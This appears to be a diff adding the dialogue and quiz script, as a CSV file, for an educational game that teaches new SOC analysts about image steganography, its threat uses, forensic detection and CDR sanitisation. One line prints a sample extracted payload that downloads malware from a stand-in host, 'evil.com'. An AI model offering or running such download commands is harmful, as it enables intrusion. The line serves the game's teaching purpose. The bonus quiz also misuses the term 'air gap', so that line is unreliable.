@@ -1,0 +1,225 @@
+ID,Character,Type,Emotion,Content,Choices,Next,Points,Location,Background
+9,System,TEXT,default,*Press the screen to start the game.*,,100,0,Title Screen,title
+100,System,TEXT,default,[CHAPTER 1: THE INVISIBLE INK],,101,0,Lobby,chapter/1
+101,Alex,TEXT,nervous,(Deep breath) Okay. First day at DataGuard Dynamics. Big league cybersecurity.,,102,0,Lobby,lobby
+102,Receptionist,TEXT,happy,Good morning! You must be the new hire for the SOC team?,,103,0,Lobby,lobby
+103,Alex,TEXT,happy,"Yes, I'm Alex. I'm reporting to Sarah.",,104,0,Lobby,lobby
+104,Receptionist,TEXT,default,Here is your badge. You need to swipe it at the elevators. 4th Floor.,,105,0,Lobby,lobby
+105,Receptionist,TEXT,happy,"Oh, and don't let Sarah scare you. She's tough but she's the best.",,106,0,Lobby,lobby
+106,Alex,TEXT,nervous,Thanks... I'll try to remember that.,,107,0,Lobby,lobby
+107,System,TEXT,default,[You walk to the elevators. A security guard watches you.],,108,0,Elevator Hall,ehall
+108,Guard,TEXT,serious,Badge check.,,109,0,Elevator Hall,ehall
+109,Alex,TEXT,default,Just got it.,,110,0,Elevator Hall,ehall
+110,Guard,TEXT,default,"DataGuard SOC, huh? Good luck, kid. They handle the weird stuff up there.",,111,0,Elevator Hall,ehall
+111,Alex,TEXT,thoughtful,Weird stuff... that sounds promising.,,112,0,Elevator Hall,ehall
+112,System,TEXT,default,[You enter the elevator. The doors close.],,113,0,Elevator,elevator
+113,Alex,TEXT,thoughtful,Okay. Don't ask stupid questions. Just listen. Learn the tools.,,114,0,Elevator,elevator
+114,System,TEXT,default,[The doors open. The Security Operations Center is a dark room filled with glowing blue monitors.],,115,0,SOC Main Desk,socmain
+115,Sarah,TEXT,default-mug,"...so I told IT that if they don't patch the server, I'm unplugging it myself. Oh, hello.",,116,0,SOC Main Desk,socmain
+116,Alex,TEXT,happy,Hi! I'm Alex. The new Junior Analyst?,,117,0,SOC Main Desk,socmain
+117,Sarah,TEXT,happy-mug,"Welcome aboard, Alex. I'm Sarah, Senior Analyst. You're right on time.",,118,0,SOC Main Desk,socmain
+118,Sarah,TEXT,default-mug,Put your bag down. Do you drink coffee?,,119,0,SOC Main Desk,socmain
+119,Alex,TEXT,default,Not really.,,120,0,SOC Main Desk,socmain
+120,Sarah,TEXT,happy-mug,That's alright. We have a specific training module for you today.,,121,0,SOC Main Desk,socmain
+121,Alex,TEXT,nervous,Is it about hacking? Firewalls? Passwords?,,122,0,SOC Main Desk,socmain
+122,Sarah,TEXT,default-mug,Not exactly. Today we are talking about the art of hiding things in plain sight.,,123,0,SOC Main Desk,socmain
+123,Sarah,TEXT,default-mug,It is called 'Steganography'. Ever heard of it?,,124,0,SOC Main Desk,socmain
+124,Alex,TEXT,confused,Stega... what-now? That sounds like a dinosaur.,,125,0,SOC Main Desk,socmain
+125,Sarah,TEXT,happy-mug,(Laughs) Steg-an-og-ra-phy. It's Greek. It basically means 'covered writing'.,,126,0,SOC Main Desk,socmain
+126,Sarah,TEXT,default-mug,Let's start with a simple question to see where your head is at.,,127,0,SOC Main Desk,socmain
+127,Sarah,QUESTION,default-mug,"Have you ever heard of 'Invisible Ink', like in old spy movies?","Yes, you write with lemon juice and heat it up to see the message -> 129; No, I only watch sci-fi -> 128",,0,SOC Main Desk,socmain
+128,Sarah,TEXT,default-mug,"Well, in sci-fi, think of a cloaking device. But let's stick to the spy analogy.",,129,0,SOC Main Desk,socmain
+129,Sarah,TEXT,default-mug,Steganography is basically digital invisible ink. It is often confused with Cryptography.,,130,0,SOC Main Desk,socmain
+130,Alex,TEXT,default,I thought Cryptography was the secret code stuff?,,131,0,SOC Main Desk,socmain
+131,Sarah,TEXT,default-mug,It is. Let me give you an analogy. Imagine you want to send a secret letter to a friend.,,132,0,SOC Main Desk,socmain
+132,Sarah,TEXT,default-mug,"If you write the letter in a secret code that looks like 'XJ9-12-KL', that is Cryptography.",,133,0,SOC Main Desk,socmain
+133,Sarah,TEXT,default-mug,"If a mailman sees it, he knows it's a secret, but he can't read it. He knows you are hiding something.",,134,0,SOC Main Desk,socmain
+134,Sarah,TEXT,default-mug,"Now, imagine you write a normal boring letter about the weather, but you use invisible ink between the lines to write the secret.",,135,0,SOC Main Desk,socmain
+135,Alex,TEXT,happy,Oh! So the mailman just thinks it's a boring letter about rain. He doesn't even know there is a secret.,,136,0,SOC Main Desk,socmain
+136,Sarah,TEXT,happy-mug,Exactly! That is Steganography. It hides the *existence* of the data.,,137,0,SOC Main Desk,socmain
+137,Sarah,QUESTION,default-mug,"So, looking at it that way, what is the main goal of Steganography?",To scramble the data so it can't be read -> 138; To hide the fact that secret data even exists -> 139,,0,SOC Main Desk,socmain
+138,Sarah,TEXT,concerned,"Hint: That's Cryptography (scrambling). Remember the invisible ink. The goal isn't to scramble, it's to hide presence. Try again.",,137,0,SOC Main Desk,retry
+139,Sarah,TEXT,happy-mug,"Correct. If no one knows the data is there, no one tries to steal it. That makes it dangerous for us defenders.",,140,10,SOC Main Desk,socmain
+140,Alex,TEXT,thoughtful,"Because if we don't know it's there, we might let it walk right out the front door.",,141,0,SOC Main Desk,socmain
+141,Sarah,TEXT,default-mug,"Precisely. Now, one more concept before we hit the lab. Have you heard of Watermarking?",,142,0,SOC Main Desk,socmain
+142,Alex,TEXT,default,Like on money? Or when a photographer puts their name on a picture?,,143,0,SOC Main Desk,socmain
+143,Sarah,TEXT,default-mug,Exactly. Watermarking is usually visible. It says 'I own this'.,,144,0,SOC Main Desk,socmain
+144,Sarah,TEXT,serious,Steganography is the opposite. It wants to be invisible. It doesn't want to claim ownership; it wants to smuggle contraband.,,200,0,SOC Main Desk,socmain
+200,System,TEXT,default,[CHAPTER 2: PAINT BY NUMBERS],,201,0,Lab Station,chapter/2
+201,Sarah,TEXT,default,"Okay, sit at this training terminal. We are going to look at Digital Images.",,202,0,Lab Station,labstation
+202,Alex,TEXT,default,Like JPEGs and PNGs?,,203,0,Lab Station,labstation
+203,Sarah,TEXT,default,"Yes. To a computer, a picture isn't a picture. It's just a giant grid of numbers.",,204,0,Lab Station,labstation
+204,Sarah,TEXT,default,We call the little dots in the grid 'Pixels'. Imagine a paint-by-numbers book.,,205,0,Lab Station,labstation
+205,Sarah,TEXT,default,Take a look at this diagram. It shows how a computer sees an image.,,206,0,Lab Station,labstation
+206,System,TEXT,default,[Shows a diagram.],,207,0,Lab Station,rgb
+207,Sarah,TEXT,default,"Each pixel is made of three colors mixed together: Red, Green, and Blue. We call this RGB.",,208,0,Lab Station,rgb
+208,Alex,TEXT,default,"Okay, so every dot has a recipe. A little red, a little green...",,209,0,Lab Station,rgb
+209,Sarah,TEXT,default,Right. The computer uses numbers from 0 to 255 to decide how much of each color to use.,,210,0,Lab Station,rgb
+210,Sarah,TEXT,default,0 is 'None of this color'. 255 is 'Maximum amount of this color'.,,211,0,Lab Station,rgb
+211,Sarah,QUESTION,default,"So, if a pixel has a Blue value of 255, what does it look like?",Very bright blue -> 213; Completely black -> 212,,0,Lab Station,rgb
+212,Sarah,TEXT,concerned,"Hint: Remember, 255 is the Maximum. 0 would be black (no light). Try again.",,211,0,Lab Station,retry
+213,Sarah,TEXT,default,Right. Bright Blue. But computers don't think in '255'. They think in Binary.,,214,10,Lab Station,labstation
+214,Alex,TEXT,nervous,"Binary... that's the 0s and 1s, right? I was never good at math.",,215,0,Lab Station,labstation
+215,Sarah,TEXT,default,It's easy. Think of 8 light switches in a row. A '1' is ON. A '0' is OFF.,,216,0,Lab Station,labstation
+216,Sarah,TEXT,default,The number 255 is all switches ON: 11111111.,,217,0,Lab Station,labstation
+217,Sarah,TEXT,default,The number 254 is the last switch OFF: 11111110. Notice only the last digit changed?,,218,0,Lab Station,labstation
+218,System,TEXT,default,[Shows a diagram.],,219,0,Lab Station,lsb
+219,Alex,TEXT,thoughtful,"Yeah, I see it in the diagram. Just the last one flipped from a 1 to a 0.",,220,0,Lab Station,lsb
+220,Sarah,TEXT,default,We call that last digit the 'Least Significant Bit' or LSB.,,221,0,Lab Station,lsb
+221,Sarah,QUESTION,default,Why do you think we call it 'Least Significant'?,Because it changes the value the most -> 222; Because it changes the value the least -> 223,,0,Lab Station,lsb
+222,Sarah,TEXT,concerned,"Hint: Think about money. If you have $1000 and I steal $1, that is 'Least Significant'. If I steal the $1000 bill, that is 'Most Significant'. Try again.",,221,0,Lab Station,retry
+223,Sarah,TEXT,happy,Correct. Changing that last bit only changes the color shade by a tiny fraction.,,224,10,Lab Station,labstation
+224,Sarah,TEXT,default,Look at these two squares.,,225,0,Lab Station,blue
+225,System,TEXT,default,[Shows a diagram.],,226,0,Lab Station,blue
+226,Sarah,TEXT,default,One of these squares is Blue 255. The other is Blue 254. Can you tell which is which?,,227,0,Lab Station,blue
+227,Alex,TEXT,confused,No way. They look exactly the same.,,228,0,Lab Station,blue
+228,Sarah,TEXT,happy,Exactly! Your human eye can't see the difference. But the computer sees a different number.,,229,0,Lab Station,blue
+229,Sarah,TEXT,default,Hackers use that tiny space�that difference between 255 and 254�to store their secret code.,,230,0,Lab Station,blue
+230,Alex,TEXT,surprised,Whoa. So they are stuffing secrets into the colors?,,231,0,Lab Station,blue
+231,Sarah,TEXT,default,Yes. They replace the real LSBs with their secret message bits.,,232,0,Lab Station,blue
+232,Sarah,QUESTION,default,"If a hacker hides a file inside a picture of a cat using this method, does the picture file size change drastically?","Yes, it doubles in size -> 233; No, it usually stays about the same -> 234",,0,Lab Station,blue
+233,Sarah,TEXT,concerned,"Hint: Not necessarily. Since they are *changing* the existing numbers (swapping 1s for 0s) rather than adding new numbers to the end, the size often stays very similar. That's why it's hard to catch.",,232,0,Lab Station,retry
+234,Sarah,TEXT,happy,"Correct. The file size looks normal. The image looks normal. But inside the numbers, there is a secret message.",,235,10,Lab Station,labstation
+235,Alex,TEXT,thoughtful,That is incredibly sneaky. And kind of cool.,,236,0,Lab Station,labstation
+236,Sarah,TEXT,serious,It is cool. Until it's used to steal your credit card info. Let's go to the Briefing Room. We need to talk about threats.,,300,0,Lab Station,labstation
+300,System,TEXT,default,[CHAPTER 3: THE BAD GUYS],,301,0,Briefing Room,chapter/3
+301,Sarah,TEXT,serious,"Alright Alex. Focus time. Why do we, as a security company, care about this? We aren't hunting spies.",,302,0,Briefing Room,briefingroom
+302,Alex,TEXT,default,I guess because bad guys use it to hurt companies?,,303,0,Briefing Room,briefingroom
+303,Sarah,TEXT,default,Right. We call the bad guys 'Threat Actors'. There are three main ways they use image steganography.,,304,0,Briefing Room,briefingroom
+304,Sarah,TEXT,default,"Covert Communication, Hidden Malware and Data Exfiltration.",,305,0,Briefing Room,briefingroom
+305,Alex,TEXT,confused,Can we break those down? 'Covert Communication' sounds like the spy stuff.,,306,0,Briefing Room,briefingroom
+306,Sarah,TEXT,default,"It is. Terrorists or criminals can post a photo of a celebrity on a public forum. To us, it's just a photo.",,307,0,Briefing Room,briefingroom
+307,Sarah,TEXT,default,"But to their partner, it contains coordinates or instructions.",,308,0,Briefing Room,briefingroom
+308,Alex,TEXT,question,"But wait, if I upload a photo to Facebook, doesn't Facebook compress it? Like, make it smaller?",,309,0,Briefing Room,briefingroom
+309,Sarah,TEXT,happy,"Great question! Yes, social media sites often 'scrub' or compress images, which can destroy the hidden message.",,310,0,Briefing Room,briefingroom
+310,Sarah,TEXT,default,"So hackers are getting smarter. They use platforms that don't compress images, or they use robust algorithms that survive compression.",,311,0,Briefing Room,briefingroom
+311,Sarah,TEXT,serious,Next is 'Hidden Malware'. This is a big one for businesses.,,312,0,Briefing Room,briefingroom
+312,Sarah,TEXT,default,Imagine you have a virus on your computer. But the virus doesn't know what to do yet.,,313,0,Briefing Room,briefingroom
+313,Sarah,TEXT,default,"So, the virus visits a website and downloads a logo image.",,314,0,Briefing Room,briefingroom
+314,Alex,TEXT,default,Okay... it downloads a logo. So what?,,315,0,Briefing Room,briefingroom
+315,Sarah,TEXT,default,"Hidden inside that logo are the instructions: 'Attack the Payroll Server'. The virus reads the pixels, gets the order, and attacks.",,316,0,Briefing Room,briefingroom
+316,Alex,TEXT,surprised,So the image acts like a commander giving orders?,,317,0,Briefing Room,briefingroom
+317,Sarah,TEXT,default,Yes. And finally: Data Exfiltration. That's a fancy word for 'Stealing Data'.,,318,0,Briefing Room,briefingroom
+318,Sarah,QUESTION,default,"If an angry employee wanted to steal a customer list without the alarm going off, how would they use steganography?",Print the list and hide it in their shoe -> 319; Hide the list inside a photo of their dog and email it to themselves -> 320,,0,Briefing Room,briefingroom
+319,Sarah,TEXT,concerned,Hint: That is physical theft! We are talking about digital steganography. How would they use a *digital image* to steal the data?,,318,0,Briefing Room,retry
+320,Sarah,TEXT,happy,Bingo. They take a photo of their dog. They use software to inject the customer list into the dog photo's pixels.,,321,10,Briefing Room,briefingroom
+321,Sarah,TEXT,default,They email the photo to their personal address. Our security systems just see 'Cute Dog.jpg' and let it through.,,322,0,Briefing Room,briefingroom
+322,Alex,TEXT,concerned,"And once it's out, they extract the list at home. That's a huge blind spot for us.",,323,0,Briefing Room,briefingroom
+323,Sarah,TEXT,serious,It is. It's tough to detect because we respect user privacy. We don't want to analyze everyone's family photos.,,324,0,Briefing Room,briefingroom
+324,Alex,TEXT,thoughtful,It's a balance between security and privacy.,,325,0,Briefing Room,briefingroom
+325,Sarah,TEXT,default,"Exactly. But today, we have a job to do. Let's head back to the SOC.",,400,0,Briefing Room,briefingroom
+400,System,TEXT,default,[CHAPTER 4: THE FALSE ALARM & THE TRAP],,401,0,SOC Workstation,chapter/4
+401,System,TEXT,default,[You go to your assigned desk. The room is buzzing with activity.],,402,0,SOC Workstation,socworkstation
+402,Sarah,TEXT,default,"Okay, settle in. Keep an eye on the alert dashboard.",,403,0,SOC Workstation,socworkstation
+403,System,TEXT,default,[A yellow light starts blinking on your dashboard.],,404,0,SOC Workstation,caution
+404,Alex,TEXT,nervous,"Uh, Sarah? Why is my screen yellow?",,405,0,SOC Workstation,caution
+405,Sarah,TEXT,calm,That's a Low Level Alert. A file in the Marketing folder is 'acting strange'. Check it out.,,406,0,SOC Workstation,caution
+406,Alex,TEXT,default,Okay. Filename: 'poster_draft_v1.jpg'. I'll run a visual analysis.,,407,0,SOC Workstation,glitch
+407,System,TEXT,default,[Alex does a visual analysis],,408,0,SOC Workstation,glitch
+408,Alex,TEXT,happy,Aha! Look at the bottom! It's all glitchy and green. That must be the hidden data!,,409,0,SOC Workstation,glitch
+409,Sarah,QUESTION,default,Is Alex right? Is visible glitching usually a sign of professional steganography?,"Yes, hidden data always looks like glitches -> 410; No, steganography is meant to be invisible. This is likely just a corrupted file -> 411",,0,SOC Workstation,glitch
+410,Sarah,TEXT,concerned,"Hint: Remember Chapter 1? If you can see it, it's failed steganography. Professional tools hide data invisibly. Glitches usually just mean the file is broken.",,409,0,SOC Workstation,retry
+411,Sarah,TEXT,happy,"Correct. Don't get trigger happy, Alex. That looks like a file transfer error, not a hack.",,412,10,SOC Workstation,glitch
+412,Sarah,TEXT,default,"If you can see the glitches, it's probably just a broken file. Steganography is invisible.",,413,0,SOC Workstation,glitch
+413,Alex,TEXT,embarrassed,"Right. Invisible. Got it. Marking as 'Corrupted', not 'Malicious'.",,414,0,SOC Workstation,socworkstation
+414,Sarah,TEXT,happy,"Don't worry, everyone makes that mistake their first week. It's better to be safe than sorry.",,415,0,SOC Workstation,socworkstation
+415,System,TEXT,default,"[Suddenly, a siren sounds. RED flashing lights cover the screen.]",,416,0,SOC Workstation,threat
+416,Alex,TEXT,scared,"Okay, that one is definitely not yellow.",,417,0,SOC Workstation,threat
+417,Sarah,TEXT,serious,Real threat. Incoming. Threat Intel just flagged an email.,,418,0,SOC Workstation,threat
+418,System,TEXT,default,ALERT: SUSPICIOUS EMAIL. FROM: ceo-update@fakedmain.com. ATTACHMENT: 'CompanyPicnic.jpg'.,,419,0,SOC Workstation,threat
+419,Sarah,TEXT,default,"Okay, look at the details. The sender address is misspelled (fakedmain.com).",,420,0,SOC Workstation,threat
+420,Sarah,TEXT,default,The attachment is 'CompanyPicnic.jpg'. It looks perfectly normal. It passed the antivirus.,,421,0,SOC Workstation,threat
+421,Alex,TEXT,default,"Okay, I see the file on the desktop. It's inside a 'Sandbox' so it's safe to touch.",,422,0,SOC Workstation,threat
+422,Sarah,QUESTION,default,What is your first instinct? How do we check if it's safe?,Double-click the image to see if it looks weird -> 423; Use a scanning tool to look at the code -> 424,,0,SOC Workstation,threat
+423,Sarah,TEXT,angry,"Hint: NO! Never just 'open' a suspicious file! If there is an exploit in the image viewer, you just infected the machine. Always treat it as a bomb.",,422,0,SOC Workstation,threat
+424,Sarah,TEXT,happy,Good choice. Never execute or open. We analyze.,,425,10,SOC Workstation,threat
+425,Sarah,TEXT,default,We are going to use a tool called 'StegDetect'. It looks at the statistics of the pixels.,,426,0,SOC Workstation,threat
+426,Alex,TEXT,default,"[Alex types commands] Okay, scanning...",,427,0,SOC Workstation,threat
+427,System,TEXT,default,SCAN RESULT: ABNORMAL NOISE DETECTED. HIGH ENTROPY.,,428,0,SOC Workstation,threat
+428,Alex,TEXT,confused,'High Entropy'? What does that mean?,,429,0,SOC Workstation,threat
+429,Sarah,TEXT,default,Entropy means randomness. Normal photos have patterns. A blue sky has a lot of similar blue pixels.,,430,0,SOC Workstation,threat
+430,Sarah,TEXT,default,"Encrypted secret data looks like total random garbage. If a photo has too much randomness in the LSBs, it's suspicious.",,450,0,SOC Workstation,threat
+450,Sarah,TEXT,default,"This analysis is the core of Image Forensics. It's digital detective work.",,451,0,SOC Workstation,threat
+451,Alex,TEXT,confused,"Forensics? Like dusting for fingerprints?",,452,0,SOC Workstation,threat
+452,Sarah,TEXT,default,"Exactly. When code is hidden in an image, it leaves 'artifacts' or scars in the data structure.",,453,0,SOC Workstation,threat
+453,Sarah,TEXT,default,"To confirm a threat, we look at three things: File Headers, Metadata, and Histograms.",,454,0,SOC Workstation,threat
+454,System,TEXT,default,"",,455,0,SOC Workstation,threat
+455,Sarah,TEXT,default,"First, File Headers. Sometimes a file claims to be a JPG, but the internal header says it's an executable (EXE).",,456,0,SOC Workstation,threat
+456,Alex,TEXT,default,"Okay, so we check if the file is lying about its identity.",,457,0,SOC Workstation,threat
+457,Sarah,TEXT,default,"Right. Second is Metadata. Hackers sometimes forget to scrub the GPS data or the 'Software Used' tags, which can tell us who made it.",,458,0,SOC Workstation,threat
+458,Sarah,TEXT,default,"And finally, Pixel Statistics. This is how we found the entropy.",,459,0,SOC Workstation,threat
+459,Sarah,TEXT,default,"We use a Histogram graph. A normal photo has smooth curves. A stego-image often has jagged 'steps' because bits were flipped artificially.",,460,0,SOC Workstation,threat
+460,System,TEXT,default,"",,461,0,SOC Workstation,threat
+461,Sarah,TEXT,default,"That jagged pattern is the mathematical proof of the 'Abnormal Noise' alert we just saw.",,431,10,SOC Workstation,threat
+431,Alex,TEXT,default,"Okay, so the tool thinks there is something hidden. Can we get it out?",,432,0,SOC Workstation,threat
+432,Sarah,TEXT,default,Try running the 'Extract' command. Use the password '12345'�hackers are often lazy.,,433,0,SOC Workstation,threat
+433,Alex,TEXT,happy,It worked! It extracted a text file.,,434,0,SOC Workstation,socworkstation
+434,System,TEXT,default,EXTRACTED DATA: 'powershell.exe -download_malware evil.com/virus',,435,0,SOC Workstation,socworkstation
+435,Alex,TEXT,scared,It's a command to download a virus! Hidden right inside the picnic basket.,,436,0,SOC Workstation,socworkstation
+436,Sarah,TEXT,serious,"Exactly. If someone had clicked a program that reads this image, our network would be compromised.",,437,0,SOC Workstation,socworkstation
+437,Sarah,TEXT,happy,"Good catch, Alex. You identified the threat. But there is a problem.",,438,0,SOC Workstation,socworkstation
+438,Alex,TEXT,default,What problem?,,439,0,SOC Workstation,socworkstation
+439,Sarah,TEXT,default,"We receive 10,000 images a day. We can't do this manual scan for every single one.",,440,0,SOC Workstation,socworkstation
+440,Sarah,TEXT,default,I need you to come up with a better solution.,,500,0,SOC Workstation,socworkstation
+500,Sarah,TEXT,default,Let's go to my office. We need to talk about automation and protection.,,501,0,SOC Workstation,socworkstation
+501,System,TEXT,default,[CHAPTER 5: WASHING THE DATA],,502,0,Manager Office,chapter/5
+502,Alex,TEXT,default,"So if we can't scan everything because it takes too long, what do we do?",,503,0,Manager Office,manageroffice
+503,Sarah,TEXT,default,We can't just block all images. Marketing needs them. HR needs them.,,504,0,Manager Office,manageroffice
+504,Sarah,TEXT,default,We use a technique called CDR. Content Disarm and Reconstruction.,,505,0,Manager Office,manageroffice
+505,Alex,TEXT,confused,That sounds like bomb disposal.,,506,0,Manager Office,manageroffice
+506,Sarah,TEXT,happy,"It is! But for files. Think of it like... laundering money, but the opposite. We want to clean the file.",,507,0,Manager Office,manageroffice
+507,System,TEXT,default,Look at the diagram.,,508,0,Manager Office,cdr
+508,Sarah,TEXT,default,Imagine I give you a Lego castle that might have a bomb hidden inside the bricks.,,509,0,Manager Office,cdr
+509,Sarah,TEXT,default,"Instead of searching for the bomb, you smash the castle completely.",,510,0,Manager Office,cdr
+510,Alex,TEXT,surprised,I smash it?,,511,0,Manager Office,cdr
+511,Sarah,TEXT,default,"Yes. Then, you build an *exact copy* of the castle using brand new, safe bricks.",,512,0,Manager Office,cdr
+512,Alex,TEXT,happy,"Oh! So the new castle looks the same, but since I built it with new bricks, the bomb is gone!",,513,0,Manager Office,cdr
+513,Sarah,TEXT,happy,Exactly! That is CDR. When an email comes in with an image...,,514,0,Manager Office,cdr
+514,Sarah,TEXT,default,"The system looks at the image, destroys it, and re-draws a brand new image that looks identical.",,515,0,Manager Office,cdr
+515,Sarah,QUESTION,default,"When the system re-draws the image, what happens to the secret hidden data in the pixels?",It gets copied over to the new image -> 516; It gets destroyed because the pixels are reset -> 517,,0,Manager Office,cdr
+516,Sarah,TEXT,concerned,"Hint: No, the system doesn't copy the *files* hidden inside. It just looks at the *picture* and paints a new one. The hidden data is not part of the picture, so it doesn't get copied. Try again.",,515,0,Manager Office,retry
+517,Sarah,TEXT,happy,Correct! The secret data is lost. The pixels are 'sanitized'.,,518,10,Manager Office,manageroffice
+518,Alex,TEXT,default,"So the user gets their picture of the cat, but the hidden virus loader is scrubbed out.",,519,0,Manager Office,manageroffice
+519,Sarah,TEXT,default,Right. It's the safest way to handle image risks. We sanitize everything entering the building.,,520,0,Manager Office,manageroffice
+520,Sarah,TEXT,thoughtful,"We also look for 'Steganalysis' tools to add to our firewalls, but CDR is our best proactive defense.",,521,0,Manager Office,manageroffice
+521,Alex,TEXT,happy,I feel a lot better knowing we have a 'Lego Castle Smasher' on our side.,,522,0,Manager Office,manageroffice
+522,Sarah,TEXT,happy,(Laughs) I'm going to call it that from now on.,,523,0,Manager Office,manageroffice
+523,Sarah,TEXT,serious,Okay Alex. Final Review before I let you go for lunch. I need to make sure you got this.,,524,0,Manager Office,manageroffice
+524,Sarah,TEXT,default,Rapid fire.,,525,0,Manager Office,manageroffice
+525,Sarah,QUESTION,default,What is the difference between Steganography and Cryptography?,"Steganography hides the existence of the message. Cryptography scrambles it -> 527; Steganography is for computers, Cryptography is for phones -> 526",,0,Manager Office,manageroffice
+526,Sarah,TEXT,concerned,Hint: No. Remember the Invisible Ink vs The Secret Code. Try again.,,525,0,Manager Office,retry
+527,Sarah,TEXT,happy,Correct.,,528,10,Manager Office,manageroffice
+528,Sarah,QUESTION,default,What is the most common way to hide data in an image?,Changing the file name -> 529; Modifying the Least Significant Bit (LSB) of the pixels -> 530,,0,Manager Office,manageroffice
+529,Sarah,TEXT,concerned,Hint: Changing the file name doesn't hide data *inside* the image content. It's about the pixels. Try again.,,528,0,Manager Office,retry
+530,Sarah,TEXT,happy,Correct. Tweaking the colors just slightly.,,531,10,Manager Office,manageroffice
+531,Sarah,QUESTION,default,Why is this dangerous?,"It makes images look ugly -> 532; It allows for covert communication, hidden malware, and data theft -> 533",,0,Manager Office,manageroffice
+532,Sarah,TEXT,concerned,"Hint: Remember, if done right, the image doesn't look ugly at all. That's why it's dangerous. Try again.",,531,0,Manager Office,retry
+533,Sarah,TEXT,happy,Correct. It's a hidden channel for bad things.,,534,10,Manager Office,manageroffice
+534,Sarah,QUESTION,default,"And finally, how do we protect our users automatically?", We use CDR to sanitize/reconstruct the images -> 536;  We ban all images -> 535,,0,Manager Office,manageroffice
+535,Sarah,TEXT,concerned,Hint: We can't ban all images. The business would stop. We need a technical solution.,,534,0,Manager Office,retry
+536,Sarah,TEXT,happy,Perfect. You aced it.,,537,10,Manager Office,manageroffice
+537,Alex,TEXT,happy,Thanks Sarah. I actually understood all of that.,,538,0,Manager Office,manageroffice
+538,Sarah,TEXT,default,You did well. Steganography is a tricky subject because it feels like magic.,,539,0,Manager Office,manageroffice
+539,Sarah,TEXT,default,But it's just math. And good defense is just better math.,,540,0,Manager Office,manageroffice
+540,Alex,TEXT,default,I'm going to grab some lunch. Want anything?,,541,0,Manager Office,manageroffice
+541,Sarah,TEXT,happy,Just another coffee. And Alex?,,542,0,Manager Office,manageroffice
+542,Alex,TEXT,default,Yeah?,,543,0,Manager Office,manageroffice
+543,Sarah,TEXT,serious,If anyone sends you a picture of a cute cat today... sanitize it first.,,544,0,Manager Office,manageroffice
+544,Alex,TEXT,happy,(Laughs) Will do. See you in an hour.,,545,0,Manager Office,manageroffice
+545,System,TEXT,default,[Alex leaves the office.],,546,0,Manager Office,manageroffice
+546,System,TEXT,default,TRAINING MODULE COMPLETE.,,600,0,Manager Office,manageroffice
+600,System,TEXT,default,[BONUS ROUND: QUICK FIRE],,601,0,End Screen,chapter/6
+601,System,QUESTION,default,We have a few extra points available. Want to try?,Yes -> 602; No -> 613,602,0,End Screen,ends
+602,System,QUESTION,default,Question 1: Does standard antivirus always catch steganography?,"Yes, always -> 603; No, signatures often miss it -> 604",,0,End Screen,ends
+603,System,TEXT,default,"Incorrect. Antivirus looks for known bad code patterns. If the code is hidden inside pixels, the AV often misses it.",,602,0,End Screen,ends
+604,System,TEXT,default,Correct! Steganography often bypasses standard AV.,,605,10,End Screen,ends
+605,System,QUESTION,default,Question 2: Does printing an image destroy the hidden digital data?,Yes -> 607; No -> 606,,0,End Screen,ends
+606,System,TEXT,default,Incorrect. Printing converts the digital pixels to physical ink. The digital bits are lost.,,605,0,End Screen,ends
+607,System,TEXT,default,Correct! This is called an 'Air Gap'. Printing destroys digital steganography.,,608,10,End Screen,ends
+608,System,QUESTION,default,Question 3: Can audio files have steganography too?,"No, only images -> 609; Yes, audio and video too -> 610",,0,End Screen,ends
+609,System,TEXT,default,Incorrect. Audio has bits just like images. You can hide data in the noise of a song.,,608,0,End Screen,ends
+610,System,TEXT,default,"Correct! Audio, video, and even text documents can carry hidden payloads.",,613,10,End Screen,ends
+613,System,TEXT,default,...,,616,0,End Screen,ends
+616,System,TEXT,default,Remember: The most dangerous threats are the ones you cannot see.,,617,0,End Screen,ends
+617,System,TEXT,default,"CREDITS: Stegadevture, Femke et al., https://www.sciencedirect.com/science/article/pii/S2666557325000473",,618,0,End Screen,ends
+618,System,TEXT,default,"To restart the training, please refresh your terminal.",,,0,End Screen,ends
